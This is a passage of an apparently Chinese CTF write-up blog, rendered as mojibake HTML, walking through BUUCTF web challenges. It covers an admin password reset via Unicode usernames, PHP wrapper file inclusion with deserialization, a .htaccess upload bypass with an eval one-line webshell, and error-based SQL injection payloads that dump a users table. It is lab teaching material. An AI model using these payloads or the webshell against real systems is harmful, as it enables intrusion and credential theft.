<kbd>ADMIN</kbd>ã€‚å¹¶ä¸”åœ¨ä¿®æ”¹å¯†ç ã€æ³¨å†Œã€ç™»å½•è¿™äº›æ“ä½œä¸­ç¨‹åºéƒ½ä¼šå°†ç”¨æˆ·åå°å†™å¤„ç†ä¸€éï¼Œå› æ­¤è‹¥æ³¨å†Œç”¨æˆ·å <kbd>á´¬á´°á´¹á´µá´º</kbd> å¹¶åœ¨ç™»å½•åä¿®æ”¹å¯†ç ï¼Œä¾¿ä¼šç»è¿‡ä¸¤æ¬¡å¤„ç†å˜æˆä¿®æ”¹ <kbd>admin</kbd> çš„å¯†ç ï¼Œé‚£æˆ‘ä»¬å°±æ­£å¸¸ç™»å½•å°±è¡Œäº†ã€‚</p><img src="0009.webp" alt="" style="zoom:75%"></li></ul><h3 id="æ¡ä»¶ç«äº‰">æ¡ä»¶ç«äº‰</h3><ul><li>è®¸å¤šå¸ˆå‚…éƒ½ä¼šæä¸€ä¸‹è¿™ä¸ªè§£æ³•ï¼ŒåŸç†æ˜¯åœ¨æ³¨å†Œæ—¶è®¾ç½®ç”¨æˆ·åä¸º <kbd>admin</kbd>ï¼Œè¿™æ ·å°±ä¼šä¼ é€’ä¸€ä¸ªç”¨æˆ·åä¸º <kbd>admin</kbd> çš„ <kbd>session</kbd>ï¼Œä¸æ­¤åŒæ—¶å†æ¬¡å‘èµ·æ›´æ”¹å¯†ç çš„è¯·æ±‚ï¼Œå› ä¸ºæ²¡æœ‰ç™»å½•ï¼Œæœ¬æ¥æœåŠ¡å™¨åº”è¯¥ä¸è®¤è¯†ï¼Œä½†æ˜¯ç”±äºåå°åŒæ—¶ä¿ç•™äº†ç”¨æˆ·åä¸º <kbd>admin</kbd> çš„ <kbd>session</kbd>ï¼Œå› æ­¤æœ€ç»ˆå°±ä¼šå˜æˆä¿®æ”¹ <kbd>admin</kbd> çš„å¯†ç ã€‚è¯¥æ“ä½œååˆ†ç²—ç•¥ï¼Œè¦æ±‚ä¹Ÿé«˜ï¼Œä¸ä»…å¸ˆå‚…ä»¬åŸºæœ¬å¤ç°ä¸äº†ï¼Œç¬”è€…æ›´æ˜¯è¯•éƒ½æ²¡è¯•ã€‚</li></ul><h2 id="ZJCTF-2019-NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</h2><ul><li><p>æ‰“å¼€é¶æœºåé¡µé¢ä¸ºå¦‚ä¸‹ PHP ä»£ç ï¼Œåº”è¯¥å°±æ˜¯æœ¬é¢˜æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// GET æ–¹æ³•æ¥æ”¶ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="comment">// åˆ¤æ–­ text æ˜¯å¦è¢«èµ‹å€¼å¹¶æ£€éªŒå…¶å¯¹åº”æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸º welcome to the zjctf</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// æ‰“å°æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ file å˜é‡ä¸­æ˜¯å¦åŒ…å« flag å­—æ ·</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// è‹¥ file ä¸­ä¸åŒ…å«åˆ™å°†å…¶æŒ‡å‘çš„æ–‡ä»¶åŒ…å«è¿›æ¥</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="comment">// å°† password ååºåˆ—åŒ–å¹¶æ‰“å°</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// text å‚æ•°ä¸ç¬¦åˆè¦æ±‚åˆ™å›æ˜¾æºç </span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡åå¯çŸ¥ï¼Œç¨‹åºé€šè¿‡ GET æ–¹æ³•è·å–ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ <kbd>text</kbd> å‚æ•°éœ€è¦æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æ–‡ä»¶å†…å®¹å¿…é¡»ä¸º <code>welcome to the zjctf</code>ï¼Œè€Œ <kbd>file</kbd> å‚æ•°åˆ™ä¸èƒ½å¸¦æœ‰ <kbd>flag</kbd> å¹¶ä¸”å¯è¢« <kbd>include</kbd>ï¼Œæºç è¿˜ä»¥æ³¨é‡Šçš„å½¢å¼æç¤ºæ–‡ä»¶ <kbd>useless.php</kbd>ï¼Œè€Œ <kbd>password</kbd> å‚æ•°åˆ™ä¼šè¢«ååºåˆ—åŒ–å¹¶è¾“å‡ºã€‚åˆ°æ­¤ä¸ºæ­¢è¿˜æ— æ³•ç¡®å®šå¦‚ä½•è·å– <kbd>flag</kbd>ï¼Œå› æ­¤æˆ‘ä»¬å…ˆç ”ç©¶ä¸€ä¸‹æç¤ºçš„ <kbd>useless.php</kbd> æ–‡ä»¶ã€‚</p></li><li><p>è¯¥æ–‡ä»¶å†…å®¹å¹¶ä¸èƒ½è¢«æµè§ˆå™¨ç›´æ¥è·å–ï¼Œå› æ­¤æ˜¯æ™®é€šçš„ PHP ä»£ç æ–‡ä»¶ã€‚æƒ³è¦è¯»å–å…¶ä¸­å†…å®¹å¯å€ŸåŠ©ç¨‹åºä¸­çš„åŒ…å«æ“ä½œï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦è®© <kbd>text</kbd> æŒ‡å‘ä¸€ä¸ªå«æŒ‡å®šå†…å®¹çš„æ–‡ä»¶ã€‚è¿™ä¸€ä»»åŠ¡å¯ä»¥äº¤ç»™ PHP ä¼ªåè®® <kbd>data://</kbd> æ¥å®Œå…¨ï¼Œå…¶ä¸ºä¸€ä¸ªæ•°æ®æµå°è£…å™¨ï¼Œç”¨æˆ·è¾“å…¥è¯¥æ•°æ®æµä¼šè¢«å½“ä½œ PHP æ–‡ä»¶æ‰§è¡Œï¼Œå½“ç„¶ç°åœ¨å¹¶ä¸éœ€è¦ä»–è¢«æ‰§è¡Œï¼Œå› æ­¤å¯¹å†…å®¹è¿›è¡Œ <kbd>base64</kbd> åŠ å¯†å³å¯ã€‚<kbd>text</kbd> èµ‹å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åæ„é€  <kbd>file</kbd> å‚æ•°æ¥è¯»å– <kbd>useless.php</kbd> æ–‡ä»¶ï¼Œè¿™ä¸€ä»»åŠ¡å¯ä»¥äº¤ç»™ <kbd>php://filter</kbd> æ¥å®Œæˆã€‚å…¶ä¸ºä¸€ä¸ªå…ƒå°è£…å™¨ï¼Œä½¿ç”¨ <kbd>resource</kbd> å‚æ•°æŒ‡å®šæ•°æ®æµï¼Œè¢«åŒ…å«æ—¶æ•°æ®æµä¼šè¢«å½“ä½œ PHP æ–‡ä»¶æ‰§è¡Œï¼Œå½“ç„¶æˆ‘ä»¬ä¾ç„¶ä¸èƒ½è®©ä»–æ‰§è¡Œï¼Œå› æ­¤å¯¹æ•°æ®æµå…ˆè¿›è¡Œ <kbd>base64</kbd> åŠ å¯†ã€‚<kbd>file</kbd> èµ‹å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></li><li><p>ç»„åˆä¸Šè¿°å‚æ•°æäº¤å³å¯æ‹¿åˆ° <kbd>base64</kbd> ç¼–ç åçš„ <kbd>useless.php</kbd> æ–‡ä»¶å†…å®¹ï¼Œ<kbd>payload</kbd> å¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>å°†æµè§ˆå™¨å›æ˜¾çš„ç¼–ç è§£ç ä¹‹åçš„ PHP ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­åŒ…å«ä¸€ä¸ªç±»ï¼Œç±»ä¸­è‡ªå¸¦äº† <kbd>&#95;&#95;tostring()</kbd> å‡½æ•°å¹¶ä¼šè¾“å‡ºå…¶ä¸­ <kbd>file</kbd> å˜é‡æ‰€æŒ‡å‘çš„æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä¸”æ³¨é‡Šæç¤º <kbd>flag.php</kbd>ï¼Œå› æ­¤æ„é€ è¯¥ç±»çš„å®ç°å¹¶è®©å…¶è¾“å‡º <kbd>flag.php</kbd> æ–‡ä»¶å³å¯è·å¾— <kbd>flag</kbd>ã€‚</p></li><li><p>å› ä¸ºç¨‹åºå¯¹å¯¹è±¡æ‰§è¡Œ <kbd>echo</kbd> æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ <kbd>&#95;&#95;tostring()</kbd> å‡½æ•°ï¼Œå› æ­¤ç°åœ¨åªéœ€å€ŸåŠ© <kbd>password</kbd> å‚æ•°çš„ååºåˆ—åŒ–æ“ä½œä¼ é€’ä¸€ä¸ªå¯¹è±¡å³å¯ã€‚å¯¹è±¡åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹ï¼Œå…¶ä¸­ <kbd>file</kbd> è¢«æŒ‡å®šä¸º <kbd>flag.php</kbd> æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç„¶åå°† <kbd>password</kbd> å‚æ•°åŠ å…¥å³å¯è·å¾— <kbd>flag</kbd>ã€‚å½“ç„¶ï¼Œç”±äºç°åœ¨éœ€è¦ <kbd>useless.php</kbd> ä½œä¸º PHP æ–‡ä»¶æ‰§è¡Œï¼Œå› æ­¤ç›´æ¥ä¼ æ–‡ä»¶åå³å¯ï¼Œæœ€ç»ˆ <kbd>payload</kbd> å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><kbd>flag</kbd> è¢«æ”¾åœ¨äº†æ³¨é‡Šä¸­ã€‚ <img src="0010.webp" alt="" style="zoom:75%"></li></ul><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><ul><li><p>æ‰“å¼€é¶æœºåï¼Œæœ¬é¢˜ä»æ ‡é¢˜åˆ°é¡µé¢éƒ½å¾ˆæœ‰ä¸ªæ€§ï¼Œä»äº¤äº’åŠŸèƒ½æ¥çœ‹ï¼Œåº”è¯¥è€ƒçš„æ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚</p><img src="0011.webp" alt="" style="zoom:75%"></li><li><p>BUU æµ‹è¯•æ—¶å›¾ç‰‡æ–‡ä»¶å¹¶ä¸èƒ½æˆåŠŸä¸Šä¼ ï¼Œè¿™æ˜¯å› ä¸ºå¹³å°é™åˆ¶äº†å¯ä¸Šä¼ çš„å¤§å°ï¼Œå°†å›¾ç‰‡ç¼©å°å³å¯ã€‚å®æµ‹åå°å¯¹ MIME ä¿¡æ¯ä½œäº†é™åˆ¶ï¼Œåªæœ‰å›¾ç‰‡æ–‡ä»¶å¯ä»¥ä¸Šä¼ æˆåŠŸï¼ŒåŒæ—¶å¯¹äº <kbd>php</kbd>ã€<kbd>php3</kbd>ã€<kbd>phtml</kbd> ç­‰åç¼€åå‡ä½œäº†é™åˆ¶ï¼Œä½†æ˜¯ <kbd>.htaccess</kbd> å¯ä»¥æ­£å¸¸ä¸Šä¼ ï¼Œå› æ­¤é¦–å…ˆä½¿ç”¨è¯¥æ–‡ä»¶æŒ‡å®šæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶å¯è¢«è§£æä¸º PHP æ–‡ä»¶ï¼Œç„¶åå†ä¼ é©¬å³å¯ã€‚<kbd>.htaccess</kbd> æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯å°† <kbd>muma.h-t-m</kbd> æ–‡ä»¶è§£æä¸º PHP æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma.h-t-m&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ„é€ ä¸€å¥è¯æœ¨é©¬å¹¶å‘½åä¸º <kbd>muma.h-t-m</kbd>ï¼Œæœ¨é©¬å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;h-t-m&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ç„¶ååˆ†åˆ«ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œç”±äº MIME ä¿¡æ¯å­˜åœ¨è¿‡æ»¤ï¼Œå› æ­¤ä¸Šä¼ æ—¶éœ€è¦æŠŠæ•°æ®æŠ¥ä¸­çš„ <kbd>Content-Type</kbd> å­—æ®µä¿®æ”¹ä¸º <kbd>image/png</kbd>ï¼Œä¸Šä¼ ä¹‹åæµè§ˆå™¨ä¼šå›æ˜¾è·¯å¾„ã€‚</p><img src="0012.webp" alt="" style="zoom:75%"><p>æŒ‰ç…§ä¸Šè¿°è·¯å¾„ä½¿ç”¨èšå‰‘è¿æ¥å³å¯ã€‚</p><img src="0013.webp" alt="" style="zoom:75%"></li></ul><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><ul><li><p>é¶æœºé¡µé¢ä¸ºä¸€ä¸ªç™»å½•æ¡†ï¼Œæµ‹è¯•æ—¶å«æœ‰ä¸‰ç§ååº”ç•Œé¢ï¼š</p><ol><li><p>è¾“å…¥ä¸ºæ™®é€šé”™è¯¯è´¦æˆ·å¯†ç æ—¶ï¼›</p><img src="0014.webp" alt="" style="zoom:75%"></li><li><p>è¾“å…¥ä¸ºå¸¦æœ‰å¼•å‘æŠ¥é”™çš„å­—ç¬¦æ—¶ï¼›</p><img src="0015.webp" alt="" style="zoom:75%"></li><li><p>åŒ…å«è¢«å±è”½å­—æ—¶ï¼›</p><img src="0016.webp" alt="" style="zoom:75%"></li></ol></li><li><p>æœ¬é¢˜æœ‰æŠ¥é”™å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä¸è¿‡éœ€è¦æ³¨æ„ç»•è¿‡åå°çš„å±è”½å­—ã€‚å®æµ‹å±è”½äº† <kbd>and</kbd>ã€<kbd>by</kbd>ã€<kbd>&#42;</kbd>ã€<kbd>&#92;</kbd>ã€<kbd>=</kbd> ä»¥åŠç©ºæ ¼ç­‰ï¼Œè¿™é‡Œä½¿ç”¨ <kbd>extractvalue()</kbd> å‡½æ•°æ¥æŠ¥é”™ï¼Œç”±äºç©ºæ ¼ä¸æ˜Ÿå·éƒ½è¢«å±è”½ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨æ³¨é‡Šç»•è¿‡ç©ºæ ¼ï¼Œä½†æ˜¯è¿˜å¯ä»¥åˆ©ç”¨å°æ‹¬å·ï¼Œæ„é€ å¦‚ä¸‹ <kbd>payload</kbd> å³å¯æŸ¥è¯¢å½“å‰æ•°æ®åº“åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,concat(&#x27;~&#x27;,database(),&#x27;~&#x27;)))#</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹å›¾ï¼Œå› æ­¤å½“å‰æ•°æ®åº“åä¸º <kbd>geek</kbd>ã€‚</p><img src="0017.webp" alt="" style="zoom:75%"></li><li><p>æ¥ä¸‹æ¥ä¾¿å¯è·å–è¡¨åï¼Œå…¶ä¸­ç©ºæ ¼ä¾ç„¶ä½¿ç”¨å°æ‹¬å·ç»•è¿‡ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç­‰å·ä¹Ÿè¢«å±è”½äº†ï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨ <kbd>like</kbd> è¿ç®—ç¬¦ç»•è¿‡ï¼Œ<kbd>payload</kbd> å¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),&#x27;~&#x27;)))#</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå› æ­¤å½“å‰æ•°æ®åº“ä»…æœ‰ä¸€å¼ åä¸º <kbd>H4rDsq1</kbd> çš„è¡¨ã€‚</p><img src="0018.webp" alt="" style="zoom:75%"></li><li><p>ç„¶åä¾¿å¯ç»§ç»­æŸ¥è¯¢å­—æ®µåï¼Œ<kbd>payload</kbd> å¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),&#x27;~&#x27;)))#</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå› æ­¤è¯¥è¡¨ä¸­å…±æœ‰ <kbd>id</kbd>ã€<kbd>username</kbd>ã€<kbd>password</kbd> ä¸‰ä¸ªå­—æ®µã€‚</p><img src="0019.webp" alt="" style="zoom:75%"></li><li><p>æœ€åä¾¿æ˜¯æ•°æ®çš„æŸ¥è¯¢ï¼Œ<kbd>payload</kbd> å¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password))from(H4rDsq1)),&#x27;~&#x27;)))#</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œ<kbd>flag</kbd> å·²ç»å‡ºæ¥äº†ï¼Œä½†æ˜¯ï¼Œç©ºé—´ä¸å¤Ÿï¼Œåªå‡ºæ¥äº†ä¸€åŠã€‚</p><img src="0020.webp" alt="" style="zoom:75%"><p>å¯ä»¥ä½¿ç”¨ <kbd>right()</kbd> å‡½æ•°æ¥å–æ•°æ®çš„åéƒ¨åˆ†å†…å®¹ï¼Œ<kbd>flag</kbd> é•¿åº¦æœ‰é™ï¼Œå› æ­¤å–åéƒ¨ <kbd>25</kbd> ä¸ªå­—ç¬¦å³å¯æ˜æ˜¾çœ‹å‡ºä¸å‰éƒ¨é‡å¤çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(right(password,25)))from(H4rDsq1)),&#x27;~&#x27;)))#</span><br></pre></td></tr></table></figure><p>å³ä¾§éƒ¨åˆ† <kbd>flag</kbd> å†…å®¹å¦‚ä¸‹ï¼Œå°†å‰åæŸ¥å‡ºæ¥çš„ç»“æœæ‹¼æ¥å»é‡å³å¯æ‹¿åˆ°å®Œæ•´ <kbd>flag</kbd>ã€‚</p><img src="0021.webp" alt="" style="zoom:75%"></li></ul><h2 id="MRCTF2020-Ez-bypass">[MRCTF2020]Ez_bypass</h2><ul><li><p>æ‰“å¼€é¶æœºåé¡µé¢ä»…æœ‰ä»¥ä¸‹å†…å®¹ï¼Œæ˜¯ä¸€æ®µå«æœ‰å…³é”®è¯ <kbd>flag</kbd> çš„æå…·è¯±æƒ‘æ€§çš„ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œç¨‹åºæ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ä»¥ GET æ–¹æ³•æ¥æ”¶ <kbd>id</kbd> ä¸ <kbd>gg</kbd> ä¸¤ä¸ªå‚æ•°ï¼Œè¦æ±‚ä»–ä»¬ä¿©å¼ºä¸ç­‰äºä½†æ˜¯ MD5 å€¼å¼ºç­‰äºã€‚å¦å¤–ä¸€ä¸ªå‚æ•° <kbd>passwd</kbd> é€šè¿‡ POST æ–¹æ³•æäº¤ï¼Œè¦æ±‚å…¶ä¸èƒ½ä¸ºçº¯æ•°å­—ï¼Œä½†æ˜¯åˆè¦ç­‰äº <kbd>1234567</kbd>ã€‚</p></li><li><kbd>id</kbd> ä¸ <kbd>gg</kbd> 